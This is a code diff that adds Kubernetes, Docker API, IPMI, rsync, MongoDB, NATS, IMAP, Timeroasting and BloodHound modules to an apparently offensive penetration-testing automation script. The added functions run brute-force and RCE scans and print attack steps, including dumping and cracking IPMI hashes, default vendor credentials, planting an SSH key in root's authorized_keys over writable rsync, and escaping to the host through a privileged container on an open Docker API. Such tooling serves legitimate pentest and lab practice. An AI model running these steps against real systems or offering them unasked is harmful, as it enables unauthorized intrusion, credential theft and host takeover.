@@ -13,6 +13,22 @@ Changes from v5 → v6:
 
   RECON ADDITIONS (gap list items 1-2)
   - follow_up_vhost()     — ffuf Host-header vhost fuzzing (VHOST-ENUM)
+
+  SPELLBOOK INTEGRATION (v6.1 — from rusted-silver.github.io/spellbook):
+  - follow_up_ipmi()       — IPMI NSE + MSF hash dump, default creds table
+  - follow_up_rsync()      — nc probe, module list, anon download, writable plant
+  - follow_up_mongodb()    — NSE mongodb-info + mongosh DB/collection enum
+  - follow_up_nats()       — natscli stream listing, monitoring varz/subsz
+  - follow_up_imap()       — IMAP NSE + openssl/curl/nc connection hints
+  - follow_up_kubernetes() — kubeletctl pods/rce scan + curl kubelet API
+  - follow_up_docker_api() — Docker remote TCP API enum + container escape
+  - follow_up_bloodhound() — bloodhound-python ALL collection + import hints
+  - follow_up_timeroast()  — nxc timeroast module + hashcat -m 31300
+  - service_follow_up() router: IPMI/623, Rsync/873, MongoDB/27017,
+    NATS/4222, IMAP/143+993, K8s/10250+6443, Docker/2375+2376
+  - UDP_CRITICAL_PORTS: added 623 (IPMI)
+  - AD scan: Timeroasting auto-prompted, BloodHound optional with creds
+  - print_tool_banner: +mongosh, +kubeletctl, +rustscan, +certipy, +bloodyad
   - follow_up_git()       — git-dumper + truffleHog .git exposure check
   - follow_up_exiftool()  — exiftool metadata extraction from discovered files
   - searchsploit_banners()— auto searchsploit all product/version banners from XML
@@ -187,6 +203,12 @@ def print_tool_banner() -> None:
         ("evil-winrm",      "WinRM shell"),
         ("impacket-GetNPUsers", "ASREPRoast"),
         ("impacket-GetUserSPNs","Kerberoast"),
+        ("bloodhound-python",   "BloodHound collection"),
+        ("mongosh",             "MongoDB enum"),
+        ("kubeletctl",          "Kubernetes enum"),
+        ("rustscan",            "Fast port scan"),
+        ("certipy",             "ADCS / shadow creds"),
+        ("bloodyad",            "ACL/ACE abuse"),
     ]
     print("\n[+] Tool availability:")
     for name, purpose in tools:
@@ -574,7 +596,7 @@ def print_triage_list(ranked: List[Dict], output_md: Optional[Path] = None) -> N
 # NSE helpers
 # ─────────────────────────────────────────────
 
-UDP_CRITICAL_PORTS = "53,69,111,123,137,138,161,162,500,1194,1900,2049,5353"
+UDP_CRITICAL_PORTS = "53,69,111,123,137,138,161,162,500,623,1194,1900,2049,5353"
 NSE_DEFAULT  = "default"
 NSE_SMB      = ("smb-security-mode,smb2-security-mode,smb-os-discovery,"
                 "smb-vuln-ms17-010,smb-enum-shares,smb-vuln-cve2009-3103")
@@ -1092,6 +1114,175 @@ def follow_up_exiftool(workspace: Path, log_file: Optional[Path]) -> None:
             label=f"exiftool {f.name}", combined_log=log_file, timeout_seconds=30)
 
 
+# NEW: IPMI hash capture (spellbook: 623 UDP IPMI)
+def follow_up_ipmi(ip: str, log_file: Optional[Path]) -> None:
+    run_streaming_command(
+        ["nmap", "-sU", "--script", "ipmi-version,ipmi-brute", "-p", "623", ip],
+        label=f"IPMI NSE {ip}", combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
+    print(f"\n  [TIP] IPMI hash dump via MSF:")
+    print(f"    msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {ip}; run'")
+    print(f"  [TIP] Default creds: Dell iDRAC root/calvin | HP iLO Administrator/<random8> | Supermicro ADMIN/ADMIN")
+    print(f"  [TIP] Crack with: hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt")
+
+
+# NEW: Rsync anonymous enumeration (spellbook: 873 TCP Rsync)
+def follow_up_rsync(ip: str, port: str, out_dir: Path, log_file: Optional[Path]) -> None:
+    run_streaming_command(
+        ["nmap", "-sV", "-p", port, "--script", "rsync-list-modules", ip],
+        label=f"Rsync NSE {ip}:{port}", combined_log=log_file, timeout_seconds=60)
+    # Probe with nc first to list banner
+    if have_bin("nc"):
+        run_streaming_command(
+            ["nc", "-nv", "-w", "3", ip, port],
+            label=f"Rsync nc probe {ip}:{port}", combined_log=log_file, timeout_seconds=15)
+    # List modules anonymously
+    run_streaming_command(
+        ["rsync", "--list-only", f"rsync://{ip}/"],
+        label=f"Rsync list modules {ip}", combined_log=log_file, timeout_seconds=60)
+    print(f"\n  [TIP] Download a module:")
+    print(f"    rsync -av rsync://{ip}/<MODULE>/ ./rsync_{ip}/")
+    print(f"  [TIP] If writable, plant SSH key:")
+    print(f"    rsync ~/.ssh/id_rsa.pub rsync://{ip}/<MODULE>/root/.ssh/authorized_keys")
+
+
+# NEW: MongoDB unauthenticated enum (spellbook: 27017 TCP MongoDB)
+def follow_up_mongodb(ip: str, port: str, log_file: Optional[Path]) -> None:
+    run_streaming_command(
+        ["nmap", "-sV", "-p", port, "--script", "mongodb-info,mongodb-databases", ip],
+        label=f"MongoDB NSE {ip}:{port}", combined_log=log_file, timeout_seconds=120)
+    if have_bin("mongosh"):
+        run_streaming_command(
+            ["mongosh", f"mongodb://{ip}:{port}", "--eval",
+             "db.adminCommand({listDatabases:1})"],
+            label=f"MongoDB list DBs {ip}:{port}", combined_log=log_file, timeout_seconds=60)
+    else:
+        print(f"\n  [TIP] Install mongosh:")
+        print(f"    wget https://downloads.mongodb.com/compass/mongodb-mongosh_2.5.10_amd64.deb")
+        print(f"    sudo dpkg -i ./mongodb-mongosh_*.deb")
+    print(f"\n  [TIP] Manual mongosh commands:")
+    print(f"    mongosh mongodb://{ip}:{port}")
+    print(f"    > show databases")
+    print(f"    > use <db>; show collections; db.<col>.find().pretty()")
+
+
+# NEW: NATS message bus enum (spellbook: 4222 TCP NATS)
+def follow_up_nats(ip: str, port: str, log_file: Optional[Path]) -> None:
+    run_streaming_command(
+        ["nmap", "-sV", "-p", port, ip],
+        label=f"NATS banner {ip}:{port}", combined_log=log_file, timeout_seconds=30)
+    # Check monitoring port
+    if have_bin("curl"):
+        run_streaming_command(
+            ["curl", "-s", f"http://{ip}:8222/varz"],
+            label=f"NATS varz {ip}", combined_log=log_file, timeout_seconds=20)
+        run_streaming_command(
+            ["curl", "-s", f"http://{ip}:8222/subsz"],
+            label=f"NATS subsz {ip}", combined_log=log_file, timeout_seconds=20)
+    print(f"\n  [TIP] Install natscli and enumerate:")
+    print(f"    go install github.com/nats-io/natscli/nats@latest")
+    print(f"    nats --server nats://{ip}:{port} stream ls")
+    print(f"    nats --server nats://{ip}:{port} sub '>'   # subscribe all subjects")
+
+
+# NEW: IMAP mail enumeration (spellbook: 143/993 TCP IMAP)
+def follow_up_imap(ip: str, port: str, log_file: Optional[Path]) -> None:
+    is_tls = port in {"993"}
+    run_streaming_command(
+        ["nmap", "-p", port, "--script", "imap-capabilities,imap-ntlm-info", ip],
+        label=f"IMAP NSE {ip}:{port}", combined_log=log_file, timeout_seconds=60)
+    if is_tls and have_bin("openssl"):
+        print(f"\n  [TIP] Connect to IMAP over TLS:")
+        print(f"    openssl s_client -connect {ip}:imaps")
+    else:
+        print(f"\n  [TIP] Connect to IMAP:")
+        print(f"    nc {ip} {port}")
+        print(f"    curl -k imap://{ip}/ --user user:pass -v")
+    print(f"  [TIP] Try default/recovered creds, look for mail containing passwords")
+    print(f"  [TIP] Use Evolution GUI for full mailbox browse: sudo apt install evolution")
+
+
+# NEW: Kubernetes kubelet enum (spellbook: 10250/6443)
+def follow_up_kubernetes(ip: str, port: str, log_file: Optional[Path]) -> None:
+    run_streaming_command(
+        ["nmap", "-sV", "-p", port, "--script", "http-title,ssl-cert", ip],
+        label=f"K8s NSE {ip}:{port}", combined_log=log_file, timeout_seconds=60)
+    if have_bin("curl"):
+        run_streaming_command(
+            ["curl", "-sk", f"https://{ip}:{port}/pods"],
+            label=f"K8s pods {ip}:{port}", combined_log=log_file, timeout_seconds=30)
+        run_streaming_command(
+            ["curl", "-sk", f"https://{ip}:{port}/runningpods/"],
+            label=f"K8s runningpods {ip}:{port}", combined_log=log_file, timeout_seconds=30)
+    if have_bin("kubeletctl"):
+        run_streaming_command(
+            ["kubeletctl", "-i", "--server", ip, "pods"],
+            label=f"K8s kubeletctl pods {ip}", combined_log=log_file, timeout_seconds=60)
+        run_streaming_command(
+            ["kubeletctl", "-i", "--server", ip, "scan", "rce"],
+            label=f"K8s kubeletctl scan rce {ip}", combined_log=log_file, timeout_seconds=60)
+    else:
+        print(f"  [TIP] Install kubeletctl:")
+        print(f"    wget https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64")
+        print(f"    chmod +x kubeletctl_linux_amd64 && mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl")
+
+
+# NEW: Docker unauthenticated API (spellbook: 2375/2376)
+def follow_up_docker_api(ip: str, port: str, log_file: Optional[Path]) -> None:
+    if have_bin("curl"):
+        run_streaming_command(
+            ["curl", "-s", f"http://{ip}:{port}/version"],
+            label=f"Docker API version {ip}:{port}", combined_log=log_file, timeout_seconds=20)
+        run_streaming_command(
+            ["curl", "-s", f"http://{ip}:{port}/containers/json"],
+            label=f"Docker API containers {ip}:{port}", combined_log=log_file, timeout_seconds=20)
+    if have_bin("docker"):
+        run_streaming_command(
+            ["docker", "-H", f"tcp://{ip}:{port}", "ps"],
+            label=f"Docker remote ps {ip}:{port}", combined_log=log_file, timeout_seconds=30)
+        run_streaming_command(
+            ["docker", "-H", f"tcp://{ip}:{port}", "images"],
+            label=f"Docker remote images {ip}:{port}", combined_log=log_file, timeout_seconds=30)
+    print(f"\n  [TIP] Escape to host via privileged container:")
+    print(f"    docker -H tcp://{ip}:{port} run --rm -d --privileged -v /:/hostsystem alpine")
+    print(f"    docker -H tcp://{ip}:{port} exec -it <ID> chroot /hostsystem sh")
+
+
+# NEW: BloodHound collection trigger (after AD creds confirmed)
+def follow_up_bloodhound(ip: str, domain: str, user: str, password: str,
+                          workspace: Path, log_file: Optional[Path]) -> None:
+    bh_out = workspace / "bloodhound"
+    bh_out.mkdir(exist_ok=True)
+    if have_bin("bloodhound-python"):
+        run_streaming_command(
+            ["bloodhound-python", "-c", "ALL",
+             "-ns", ip, "-u", user, "-p", password,
+             "-d", domain, "--zip", "-o", str(bh_out)],
+            label=f"BloodHound collection {domain}", combined_log=log_file,
+            timeout_seconds=300)
+        print(f"\n  [+] BloodHound data in: {bh_out}")
+        print(f"  [TIP] Import zip into BloodHound neo4j then run:")
+        print(f"    'Shortest Paths to Domain Admins from Owned Principals'")
+        print(f"    'Find all Kerberoastable Users'")
+        print(f"    'Find AS-REP Roastable Users'")
+    else:
+        print(f"  [TIP] Install bloodhound-python: pip3 install bloodhound")
+        print(f"  [TIP] Then run:")
+        print(f"    bloodhound-python -c ALL -ns {ip} -u {user} -p {password} -d {domain} --zip")
+
+
+# NEW: Timeroasting (spellbook: nxc timeroast module)
+def follow_up_timeroast(ip: str, log_file: Optional[Path]) -> None:
+    cme = "netexec" if have_bin("netexec") else ("crackmapexec" if have_bin("crackmapexec") else None)
+    if cme:
+        run_streaming_command(
+            [cme, "smb", ip, "-M", "timeroast"],
+            label=f"Timeroast {ip}", combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
+        print(f"\n  [TIP] Crack timeroast hashes:")
+        print(f"    hashcat -a 0 -m 31300 --user ./hashes /usr/share/wordlists/rockyou.txt")
+    else:
+        print(f"  [TIP] netexec/crackmapexec required for timeroasting.")
+
+
 def service_follow_up(parsed: Dict, workspace: Path, log_file: Optional[Path]) -> None:
     follow_dir = workspace / "follow_up"
     follow_dir.mkdir(exist_ok=True)
@@ -1147,6 +1338,21 @@ def service_follow_up(parsed: Dict, workspace: Path, log_file: Optional[Path]) -
                 follow_up_mysql(ip, port, log_file)
             elif svc in {"wsman", "winrm"} or port in {"5985", "5986"}:
                 follow_up_winrm(ip, port, log_file)
+            # ── NEW SERVICES FROM SPELLBOOK ──────────────────────────────
+            elif svc == "ipmi" or port == "623":
+                follow_up_ipmi(ip, log_file)
+            elif svc == "rsync" or port == "873":
+                follow_up_rsync(ip, port, follow_dir, log_file)
+            elif svc in {"mongod", "mongodb"} or port in {"27017", "27018", "27019"}:
+                follow_up_mongodb(ip, port, log_file)
+            elif svc == "nats" or port in {"4222", "8222"}:
+                follow_up_nats(ip, port, log_file)
+            elif svc == "imap" or port in {"143", "993"}:
+                follow_up_imap(ip, port, log_file)
+            elif port in {"10250", "10255", "6443"}:
+                follow_up_kubernetes(ip, port, log_file)
+            elif port in {"2375", "2376"}:
+                follow_up_docker_api(ip, port, log_file)
 
 
 # ─────────────────────────────────────────────
@@ -1527,6 +1733,20 @@ def ad_scan() -> None:
                               label="AD null-session shares", combined_log=log_file, timeout_seconds=60)
         run_streaming_command([cme, "smb", target, "--users", "-u", "", "-p", ""],
                               label="AD null-session users", combined_log=log_file, timeout_seconds=60)
+
+    # Timeroasting — unauthenticated, run immediately
+    if yes_no("Run Timeroasting (unauthenticated computer account hashes)?", default=True):
+        follow_up_timeroast(target, log_file)
+
+    # BloodHound collection — needs creds
+    if yes_no("Run BloodHound collection (requires valid domain creds)?", default=False):
+        bh_domain = input("  Domain (e.g. corp.local): ").strip()
+        bh_user   = input("  Username: ").strip()
+        bh_pwd    = input("  Password: ").strip()
+        if bh_domain and bh_user and bh_pwd:
+            bh_workspace = workspace / "bloodhound"
+            bh_workspace.mkdir(exist_ok=True)
+            follow_up_bloodhound(target, bh_domain, bh_user, bh_pwd, bh_workspace, log_file)
 
     # AD-specific follow-up hints
     print("\n" + "═" * 60)
